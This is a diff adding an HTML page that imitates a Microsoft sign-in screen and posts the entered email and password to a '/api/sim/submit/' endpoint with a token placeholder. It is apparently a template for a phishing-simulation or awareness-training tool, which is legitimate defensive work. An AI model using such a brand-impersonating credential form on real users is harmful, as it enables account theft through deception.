@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Sign in to your account</title>
+<style>
+
+body{
+font-family:Segoe UI;
+background:#f2f2f2;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh
+}
+
+.card{
+background:white;
+padding:40px;
+width:320px;
+box-shadow:0 4px 10px rgba(0,0,0,.2)
+}
+
+input{
+width:100%;
+padding:10px;
+margin-top:10px
+}
+
+button{
+width:100%;
+margin-top:15px;
+padding:10px;
+background:#0067b8;
+color:white;
+border:none
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+<h3>Microsoft</h3>
+
+<p>Sign in</p>
+
+<form method="POST" action="/api/sim/submit/TOKEN_PLACEHOLDER">
+
+<input name="email" placeholder="Email">
+
+<input name="password" type="password" placeholder="Password">
+
+<button>Sign in</button>
+
+</form>
+
+</div>
+
+</body>
+</html>
